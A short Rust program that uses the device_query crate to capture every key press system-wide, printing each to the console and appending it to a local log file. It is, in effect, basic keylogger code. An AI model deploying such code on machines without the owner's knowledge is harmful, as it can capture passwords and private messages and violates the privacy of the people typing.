use std::fs::OpenOptions;
use std::io::Write;
use device_query::{DeviceQuery, DeviceState, DeviceEvents};

fn main() {

    let device_state = DeviceState::new();
    
    let _guard = device_state.on_key_down(move |key| {
        println!("Down: {:#?}", key);

        let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("/home/oef/log.txt")
        .expect("Failed to open file");

        write!(file, "{}",  key).expect("Failed to write to file");
    });
        
    loop {}
}



